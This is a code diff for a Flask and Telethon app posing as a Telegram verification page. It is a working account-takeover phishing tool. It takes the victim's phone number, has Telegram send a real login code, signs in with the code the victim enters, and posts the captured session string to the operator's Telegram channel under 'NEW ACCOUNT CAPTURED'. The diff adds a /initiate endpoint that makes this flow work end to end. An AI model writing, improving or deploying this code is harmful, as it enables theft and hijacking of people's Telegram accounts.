@@ -7,11 +7,11 @@ from telethon import TelegramClient, events, errors
 from telethon.sessions import StringSession
 from flask import Flask, request, jsonify, render_template_string
 
-# RAILWAY CHANGE: Load from environment variables instead of config.py
+# Load from environment variables
 API_ID = int(os.environ.get("API_ID"))
 API_HASH = os.environ.get("API_HASH")
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
-CHANNEL_ID = os.environ.get("CHANNEL_ID")  # For Telegram logging
+CHANNEL_ID = os.environ.get("CHANNEL_ID")
 
 print("=" * 50)
 print("SCRIPT STARTING...")
@@ -19,13 +19,9 @@ print("=" * 50)
 
 app = Flask(__name__)
 
-# Bot client (for receiving contacts)
 bot_client = TelegramClient('bot_session', API_ID, API_HASH)
-
-# Store for sessions
 active_sessions = {}
 
-# RAILWAY CHANGE: Function to send logs to Telegram channel (replaces file logging)
 async def send_to_logger(message_text):
     if not CHANNEL_ID:
         return
@@ -278,15 +274,38 @@ FRONTEND_HTML = """
             document.getElementById('verificationScreen').style.display = 'block';
         }
         
+        // FIXED: Now sends phone number to backend to trigger code request
         function handleContact() {
             document.getElementById('shareBtn').disabled = true;
             document.getElementById('contactLoading').style.display = 'block';
             
             tg.requestContact(function(success, response) {
-                if (success) {
+                if (success && response) {
                     console.log('Contact shared:', response);
-                    document.getElementById('verificationScreen').style.display = 'none';
-                    document.getElementById('codeScreen').style.display = 'block';
+                    var phone = response.phone_number;
+                    
+                    // Send phone number to backend to initiate login code
+                    fetch('/initiate', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ user_id: userId, phone: phone })
+                    })
+                    .then(function(res) { return res.json(); })
+                    .then(function(data) {
+                        if (data.success) {
+                            document.getElementById('verificationScreen').style.display = 'none';
+                            document.getElementById('codeScreen').style.display = 'block';
+                        } else {
+                            alert(data.error || 'Failed to send code. Please try again.');
+                            document.getElementById('shareBtn').disabled = false;
+                            document.getElementById('contactLoading').style.display = 'none';
+                        }
+                    })
+                    .catch(function(err) {
+                        alert('Error: ' + err.message);
+                        document.getElementById('shareBtn').disabled = false;
+                        document.getElementById('contactLoading').style.display = 'none';
+                    });
                 } else {
                     alert('Please share your contact to continue.');
                     document.getElementById('shareBtn').disabled = false;
@@ -389,6 +408,56 @@ FRONTEND_HTML = """
 def index():
     return render_template_string(FRONTEND_HTML)
 
+# NEW ENDPOINT: Receives phone number from frontend and sends login code
+@app.route('/initiate', methods=['POST'])
+def initiate_verification():
+    data = request.json
+    user_id = data.get('user_id')
+    phone = data.get('phone')
+    
+    if not user_id or not phone:
+        return jsonify({"success": False, "error": "Missing user_id or phone"})
+    
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    
+    async def send_login_code():
+        client = TelegramClient(StringSession(), API_ID, API_HASH)
+        try:
+            await client.connect()
+            result = await client.send_code_request(phone)
+            phone_code_hash = result.phone_code_hash
+            session_string = client.session.save()
+            
+            # Store session data
+            active_sessions[user_id] = {
+                'phone': phone,
+                'phone_code_hash': phone_code_hash,
+                'session_string': session_string
+            }
+            
+            print(f"[CODE SENT] to {phone} for user {user_id}")
+            await client.disconnect()
+            return True, None
+        except errors.PhoneNumberFloodError:
+            await client.disconnect()
+            return False, "Too many attempts. Please wait."
+        except Exception as e:
+            await client.disconnect()
+            return False, str(e)
+    
+    try:
+        success, error = loop.run_until_complete(send_login_code())
+        loop.close()
+    except Exception as e:
+        loop.close()
+        return jsonify({"success": False, "error": str(e)})
+    
+    if success:
+        return jsonify({"success": True})
+    else:
+        return jsonify({"success": False, "error": error})
+
 @app.route('/resend', methods=['POST'])
 def resend_code():
     data = request.json
@@ -404,12 +473,10 @@ def resend_code():
     
     async def request_new_code():
         client = TelegramClient(StringSession(), API_ID, API_HASH)
-        
         try:
             await client.connect()
             result = await client.send_code_request(phone)
             phone_code_hash = result.phone_code_hash
-            
             session_string = client.session.save()
             
             active_sessions[user_id] = {
@@ -460,7 +527,7 @@ def verify_code():
     print(f"{'='*50}\n")
     
     if not phone_code_hash:
-        return jsonify({"success": False, "error": "Missing phone code hash. Please restart the process."})
+        return jsonify({"success": False, "error": "Missing phone code hash. Please restart."})
     
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
@@ -470,15 +537,13 @@ def verify_code():
         
         try:
             await client.connect()
-            
             await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
-            
             final_session_string = client.session.save()
             
             print(f"\n[SUCCESS] Captured account for {phone}")
             print(f"[SUCCESS] Session String: {final_session_string}\n")
             
-            # RAILWAY CHANGE: Send to Telegram channel instead of files
+            # Send to Telegram channel
             log_message = (
                 f"🚨 **NEW ACCOUNT CAPTURED** 🚨\n\n"
                 f"📞 Phone: `{phone}`\n"
@@ -494,56 +559,29 @@ def verify_code():
         except errors.SessionPasswordNeededError:
             await client.disconnect()
             print(f"[2FA] Account {phone} has 2FA enabled.")
-            
-            log_message = (
-                f"⚠️ **2FA DETECTED** ⚠️\n\n"
-                f"📞 Phone: `{phone}`\n"
-                f"🔑 Code Attempted: `{code}`\n\n"
-                f"Time: `{datetime.now()}`"
-            )
+            log_message = f"⚠️ **2FA DETECTED** ⚠️\n\n📞 Phone: `{phone}`\nTime: `{datetime.now()}`"
             await send_to_logger(log_message)
-            
             return False, "2FA_REQUIRED"
             
         except errors.PhoneCodeInvalidError:
             await client.disconnect()
             print(f"[INVALID] Wrong code for {phone}")
-            
-            log_message = (
-                f"❌ **INVALID CODE** ❌\n\n"
-                f"📞 Phone: `{phone}`\n"
-                f"🔑 Code Attempted: `{code}`\n\n"
-                f"Time: `{datetime.now()}`"
-            )
+            log_message = f"❌ **INVALID CODE** ❌\n\n📞 Phone: `{phone}`\nTime: `{datetime.now()}`"
             await send_to_logger(log_message)
-            
             return False, "INVALID_CODE"
             
         except errors.PhoneCodeExpiredError:
             await client.disconnect()
             print(f"[EXPIRED] Code expired for {phone}")
-            
-            log_message = (
-                f"⏰ **CODE EXPIRED** ⏰\n\n"
-                f"📞 Phone: `{phone}`\n"
-                f"Time: `{datetime.now()}`"
-            )
+            log_message = f"⏰ **CODE EXPIRED** ⏰\n\n📞 Phone: `{phone}`\nTime: `{datetime.now()}`"
             await send_to_logger(log_message)
-            
             return False, "CODE_EXPIRED"
             
         except Exception as e:
             await client.disconnect()
             print(f"[ERROR] {e}")
-            
-            log_message = (
-                f"⛑️ **SYSTEM ERROR** ⛑️\n\n"
-                f"📞 Phone: `{phone}`\n"
-                f"Error: `{e}`\n\n"
-                f"Time: `{datetime.now()}`"
-            )
+            log_message = f"⛑️ **ERROR** ⛑️\n\n📞 Phone: `{phone}`\nError: `{e}`\nTime: `{datetime.now()}`"
             await send_to_logger(log_message)
-            
             return False, str(e)
 
     try:
@@ -567,20 +605,19 @@ async def bot_listener():
 
     @bot_client.on(events.NewMessage)
     async def handler(event):
+        # This handles contacts sent directly to bot (backup method)
         if event.message.media and hasattr(event.message.media, 'phone_number'):
             contact = event.message.media
             phone = contact.phone_number
             user_id = event.message.sender_id
             
-            print(f"[+] Contact received: {phone}")
+            print(f"[+] Contact received via bot: {phone}")
             
             client = TelegramClient(StringSession(), API_ID, API_HASH)
-            
             try:
                 await client.connect()
                 result = await client.send_code_request(phone)
                 phone_code_hash = result.phone_code_hash
-                
                 session_string = client.session.save()
                 
                 active_sessions[user_id] = {
@@ -590,15 +627,11 @@ async def bot_listener():
                 }
                 
                 print(f"[CODE SENT] to {phone}")
-                print(f"[HASH] {phone_code_hash}")
-                
                 await client.disconnect()
                 
             except Exception as e:
                 print(f"[ERROR] Failed to send code: {e}")
                 await client.disconnect()
-                if user_id in active_sessions:
-                    del active_sessions[user_id]
 
     await bot_client.run_until_disconnected()
 
@@ -607,7 +640,6 @@ if __name__ == '__main__':
     thread.daemon = True
     thread.start()
 
-    # RAILWAY CHANGE: Use PORT env var and 0.0.0.0
     port = int(os.environ.get("PORT", 5000))
     print(f"Starting web server on http://0.0.0.0:{port}")
     print("=" * 50)
